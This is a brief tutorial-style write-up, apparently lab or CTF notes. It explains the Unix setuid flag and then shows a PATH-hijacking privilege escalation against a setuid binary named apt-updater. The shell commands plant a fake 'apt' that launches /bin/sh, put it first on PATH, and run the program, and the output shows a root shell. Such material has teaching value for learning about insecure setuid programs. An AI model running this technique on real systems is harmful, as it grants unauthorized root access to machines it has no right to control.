Setuid is a Unix access rights flag that allow users to run an executable with the file system permissions of the executable’s owner.

![image](https://user-images.githubusercontent.com/70282840/194762130-00d2b17f-72be-4cac-bd4c-24a7541e9761.png)

**Exploiting a setuid executable**
 Use file attached
 
$ mkdir /tmp/foo # create random directory to put the script

$ echo /bin/sh > /tmp/foo/apt # create the script that will launch /bin/sh

$ chmod 755 /tmp/foo/apt # mark it as executable

$ PATH=/tmp/foo:$PATH /usr/local/bin/apt-updater # override the PATH variable to that it contains /tmp/foo directory & execute the vulnerable program

id # we are root!

uid=0(root) gid=1001(creekorful) groups=1001(creekorful)
